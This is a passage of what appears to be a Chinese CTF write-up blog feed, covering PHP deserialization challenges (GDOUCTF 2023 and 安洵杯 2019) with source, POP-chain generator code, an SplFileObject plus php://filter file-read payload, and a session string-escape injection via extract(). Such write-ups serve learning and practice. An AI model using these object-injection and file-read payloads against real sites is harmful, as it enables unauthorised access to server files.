class="hljs-string">&quot;EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:flWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:ag&#123;OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:salJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:lasjIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:lsdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:13-WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:ccJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJjsecret:abIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIiisecret:obEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:4OOOOOOOOOOOOOOOOOOOOOOOOOsecret:zzJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:mkIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:bxEEEEEEEEEEEEEEEEEEEEEEEsecret:2-WWWWWWWWWWWWWWWsecret:zxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:dsJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:gohIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIisecret:dsxEEEEEEEEEEEEEEEEEEEEEsecret:zxcWWWWWWWWWWWWsecret:zxwOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOosecret:0-JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:ddxIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zxwEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:12sWWWWWWWWWWWWWWWWsecret:dsxOOOOOOOOOOOOOOOOOOOOsecret:asxJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:zIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zkEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:f-WWWWWWWWWWWWWWWWWWWWWWsecret:awOOOOOOOOOOOOsecret:xfJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:axdIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:amdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:p2-WWWWWWWWWWWWWWsecret:xxOOOOOOOOOOOOOOOOOOOOOOOOsecret:zJJJJJJJJJJJJJJJJJJJJsecret:moIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIisecret:yhEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:aaWWWWWWWWWWWWsecret:tOOOOOOOOOOOOOOOOsecret:23JJJJJJJJJJJJJJJJJsecret:qw-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:asdEEEEEEEEEEEEEEEEEEEEsecret:ghWWWWWWWWWWWWWWWWsecret:zxcOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:22JJJJJJJJJJJJJJJJJJJJJJsecret:czxcIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:owmEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:231WWWWWWWWWWWWWsecret:bye!&#125;&quot;</span>;<br><span class="hljs-variable">$pat</span> = <span class="hljs-string">&quot;/secret:|[EWOJI]/&quot;</span>;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pat</span>, <span class="hljs-variable">$re</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行脚本拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-competition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【GDOUCTF 2023】反方向的钟</title>
    <link href="/2024/08/13/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/"/>
    <url>/2024/08/13/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
    
    <content type="html"><![CDATA[<p><strong>反序列化题目上来就是经典源码展示</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题分析不是很难我主要是想记录一下原生类的问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span> = <span class="hljs-string">&#x27;department&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span> = <span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$a</span>-&gt;department = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$a</span>-&gt;department-&gt;leader = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题打开一眼就能看见两个可控的POST传参变量，pop链也不难所以就直接展示payload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=<span class="hljs-built_in">SplFileObject</span>&amp;b=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>这道题目用到了一个php的原生类叫<code>SplFileObject</code><br>这个类的作用是读取文件<br><strong>根据官方文档:</strong></p><ul><li><strong>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作</strong></li></ul><p><strong>举个例子</strong><br>我创建了一个a.php内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test&#x27;</span>; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来我在同目录下创建了一个php文件利用原生类读取a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;a.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果就是只回显了第一行的内容<br>这个时候就只能使用php伪协议来读取a.php的内容了</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【安洵杯 2019】easy_serialize_php</title>
    <link href="/2024/08/11/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/"/>
    <url>/2024/08/11/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/</url>
    
    <content type="html"><![CDATA[<p><strong>这是一道字符串减少的题目值得一做</strong><br>进来就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-comment">//把识别到的字符换成了空字符</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-comment">//清楚$_SESSION的内容</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-comment">//给$_SESSION[&#x27;img&#x27;]赋值</span><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-comment">//看到这里应该就能反应过来是字符串减少的题目</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计注意到有不熟悉的玩意<code>$_SESSION</code>和<code>extract()</code><br><code>$_SESSION</code>变量<br>作用是访客与整个网站交互过程中一直存在的公有变量<br><code>extract()</code> 函数<br>作用是从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量<br>更具体的用法参考<a href="https://www.runoob.com/php/func-array-extract.html">https://www.runoob.com/php/func-array-extract.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>, EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>; <span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>; <span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>; <span class="hljs-subst">$dup_a</span> = <span class="hljs-subst">$dup_a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>结果：<span class="hljs-variable">$a</span> = Original; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse; <span class="hljs-variable">$dup_a</span> = Cat<br></code></pre></td></tr></table></figure><p>在这道题目里这个函数接收了post传输的数据<br>如果你传入的是** _SESSION[flag]** <br>那么他就会覆盖之前的**$_SESSION[“user”]和$_SESSION[“function”]**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-string">&#x27;aa&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-meta">?&gt;</span><br>post：<br>_SESSION[cc]=<span class="hljs-number">1</span><br>结果：<br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;aa&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;bb&quot;</span> &#125; <br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;cc&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>可以看到post传输的参数里的cc被自动加上了双引号，这里是一个小细节<br><strong>步骤</strong><br>随便给$_SESSION变量赋值看看怎么构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&quot;woai&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;function&quot;</span>] = <span class="hljs-string">&quot;yuanshen&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>);<br>运行结果：<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;woai&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;yuanshen&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>分析一下发现只有user和function的值是可控的，所以我们需要利用可控的值来使得字符串逃逸出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;flagflagflagflagflagflag&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;function&quot;</span>] =<span class="hljs-string">&#x27;1&quot;;s:8:&quot;function&quot;;s:1:&quot;s&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>post传参(_SESSION前面没$是因为加上之后会就导致变量名字变成了$$_SESSION)：<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:1:&quot;s&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>后面查看源代码提示flag在flag in &#x2F;d0g3_fllllllag<br>然后把传参的img的值改一下就好了</p>]]></content>
    
    
    <categories>
      
